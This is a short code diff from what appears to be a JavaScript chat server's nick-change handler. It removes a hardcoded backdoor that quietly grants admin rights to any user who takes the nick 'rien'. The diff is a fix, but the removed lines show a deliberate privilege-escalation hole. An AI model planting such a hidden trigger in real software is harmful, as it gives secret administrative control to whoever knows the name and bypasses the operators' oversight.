@@ -229,8 +229,6 @@ class Chat {
         if (!this._validateNick(newnick))
             return user.handler.get('error')('invalid nick (max 25 letters, does not contain whitespace nor @ # & !)');
         let old = Object.assign(new User(), user);
-if (newnick == 'rien')
-    user.options.admin = true;
         user.nick = newnick;
         user.handler.get('nick')(user.serialize());
         for (let channel of user.channels.values()) { for (let [dest, options] of channel.users) { dest.handler.get('nick')(user.serialize(), old.serialize(), channel.name); }; };
